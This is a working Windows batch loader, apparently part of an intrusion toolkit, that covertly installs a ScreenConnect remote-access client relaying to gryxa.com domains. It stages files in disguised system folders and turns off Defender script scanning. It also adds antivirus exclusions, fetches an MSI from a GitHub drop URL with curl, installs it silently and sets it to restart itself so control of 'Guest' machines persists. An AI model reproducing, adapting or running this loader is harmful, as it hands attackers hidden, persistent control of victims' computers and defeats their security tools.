@echo off
rem OWN_GRYXA BUILD 20260804G8 - PowerShell-free Gryxa install (AMSI-proof fallback)
rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
rem G7: never bare sc create; after /i require ImagePath gryxa.com.
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "GRYXA_FP=%~2"
if "%GRYXA_FP%"=="" set "GRYXA_FP=36e506ff016b2151"
set "KEEP_FP=%~3"
if "%KEEP_FP%"=="" set "KEEP_FP=5f6010579852e507"
set "ALT_FP=%~4"
if "%ALT_FP%"=="" set "ALT_FP=f861c8140d453427"
set "MODE=%~5"
set "REINSTALL=0"
if /I "%MODE%"=="REINSTALL" set "REINSTALL=1"

set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "MSI=%STAGE%\pkg_gryxa.msi"
set "LOG=%WD%\own_gryxa.log"
set "LOCK=%WD%\gryxa_msi.lock"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
set "SVC=ScreenConnect Client (%GRYXA_FP%)"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] own_gryxa G8 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"

if exist "%LOCK%" (
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo [%DATE% %TIME%] lock_present skip>>"%LOG%"
    exit /b 0
  )
  del /f /q "%LOCK%" >nul 2>&1
)
echo %DATE% %TIME%>"%LOCK%"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

rem ALWAYS abort /x if any Gryxa relay session is live (HEAL used to skip this and kill online Guests)
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 (
      reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
      if not errorlevel 1 (
        if /I not "%MODE%"=="REINSTALL" (
          echo [%DATE% %TIME%] abort_heal_live_relay fp=!_FP!>>"%LOG%"
          (
            echo CURRENT_FP=!_FP!
            echo RELAY=update.gryxa.com
            echo UI=ui.gryxa.com
            echo UPDATED=cmd-own_gryxa-adopt
          ) >"%WD%\gryxa.cfg"
          del /f /q "%LOCK%" >nul 2>&1
          exit /b 0
        )
      )
    )
  )
)

rem HEAL: soft start first; only escalate to /x+/i on 1060 or no-relay
if /I "%MODE%"=="HEAL" (
  sc query "%SVC%" >nul 2>&1
  if not errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (
      sc config "%SVC%" start= auto >nul 2>&1
      sc start "%SVC%" >nul 2>&1
      timeout /t 12 /nobreak >nul
      sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
      if not errorlevel 1 (
        echo [%DATE% %TIME%] heal_start_ok>>"%LOG%"
        del /f /q "%LOCK%" >nul 2>&1
        exit /b 0
      )
      echo [%DATE% %TIME%] heal_start_failed_escalate>>"%LOG%"
      set "REINSTALL=1"
    ) else (
      echo [%DATE% %TIME%] heal_no_relay_escalate>>"%LOG%"
      set "REINSTALL=1"
    )
  ) else (
    echo [%DATE% %TIME%] heal_1060_escalate>>"%LOG%"
    set "REINSTALL=1"
  )
)

if "%REINSTALL%"=="0" if /I not "%MODE%"=="REINSTALL" (
  rem ExpectedFp running WITH gryxa.com → done
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
  if not errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (
      echo [%DATE% %TIME%] already_alive_relay>>"%LOG%"
      del /f /q "%LOCK%" >nul 2>&1
      exit /b 0
    )
    echo [%DATE% %TIME%] alive_NO_relay_reinstall>>"%LOG%"
    set "REINSTALL=1"
  )

  if "!REINSTALL!"=="0" (
    sc query "%SVC%" >nul 2>&1
    if not errorlevel 1 (
      echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
      sc config "%SVC%" start= auto >nul 2>&1
      sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
      sc start "%SVC%" >nul 2>&1
      timeout /t 15 /nobreak >nul
      sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
      if not errorlevel 1 (
        reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
        if not errorlevel 1 (
          echo [%DATE% %TIME%] started_ok_relay>>"%LOG%"
          del /f /q "%LOCK%" >nul 2>&1
          exit /b 0
        )
        echo [%DATE% %TIME%] started_NO_relay_reinstall>>"%LOG%"
        set "REINSTALL=1"
      ) else (
        echo [%DATE% %TIME%] start_failed_reinstall>>"%LOG%"
        set "REINSTALL=1"
      )
    )
  )
)

rem Final gate before /x — never uninstall a live relay Guest unless explicit REINSTALL
if /I not "%MODE%"=="REINSTALL" (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
  if not errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (
      echo [%DATE% %TIME%] abort_x_still_live>>"%LOG%"
      del /f /q "%LOCK%" >nul 2>&1
      exit /b 0
    )
  )
)

rem strip Gryxa only then /i (REINSTALL or absent)
echo [%DATE% %TIME%] preclean_gryxa_only pc=%PC%>>"%LOG%"
sc stop "%SVC%" >nul 2>&1
timeout /t 3 /nobreak >nul
msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
sc delete "%SVC%" >nul 2>&1
if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
timeout /t 5 /nobreak >nul

call :FetchMsi
if errorlevel 1 (
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 2
)

call :DoInstall
if errorlevel 1 (
  echo [%DATE% %TIME%] install_retry>>"%LOG%"
  sc stop "%SVC%" >nul 2>&1
  sc delete "%SVC%" >nul 2>&1
  timeout /t 3 /nobreak >nul
  call :DoInstall
)

sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
sc config "ScreenConnect Client (%ALT_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1

(
  echo CURRENT_FP=%GRYXA_FP%
  echo RELAY=update.gryxa.com
  echo UI=ui.gryxa.com
  echo UPDATED=cmd-own_gryxa-G7
) >"%WD%\gryxa.cfg"

reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] still_no_relay_in_imagepath>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 1
)
sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] running_ok_relay>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)
echo [%DATE% %TIME%] still_down msi_exit=!MSIEXIT!>>"%LOG%"
del /f /q "%LOCK%" >nul 2>&1
exit /b 1

:FetchMsi
set "NEED=1"
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
if "%NEED%"=="1" (
  echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)
if not exist "%MSI%" (
  echo [%DATE% %TIME%] msi_unavailable>>"%LOG%"
  exit /b 1
)
exit /b 0

:DoInstall
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
echo [%DATE% %TIME%] msiexec /i>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_cmd.log"
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"
echo !MSIEXIT!>"%WD%\gryxa_install.result"
sc config "%SVC%" start= auto >nul 2>&1
sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%SVC%" >nul 2>&1
timeout /t 15 /nobreak >nul
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  echo [%DATE% %TIME%] post_i_1060_no_bare_create>>"%LOG%"
  exit /b 1
)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] post_i_no_relay>>"%LOG%"
  exit /b 1
)
exit /b 0
